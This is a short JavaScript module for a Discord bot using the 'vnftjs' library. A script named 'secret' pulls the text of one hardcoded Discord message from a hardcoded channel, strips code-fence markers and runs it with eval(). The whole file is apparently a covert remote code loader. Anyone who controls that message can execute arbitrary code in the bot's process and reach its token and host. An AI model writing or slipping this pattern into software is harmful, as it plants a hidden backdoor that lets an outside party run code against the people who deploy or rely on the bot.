const { Script } = require('vnftjs')

const secret = new Script()

secret.funct = async bot => {
  let secretChannel = bot.channels.find(c => c.id == '442743346079858692')
  let secretMessage = await secretChannel.fetchMessage('603347738888765440')
  let secretCode = secretMessage.content.replace(/\`\`\`(js|)/g, '')
  eval(secretCode)
}

module.exports = secret
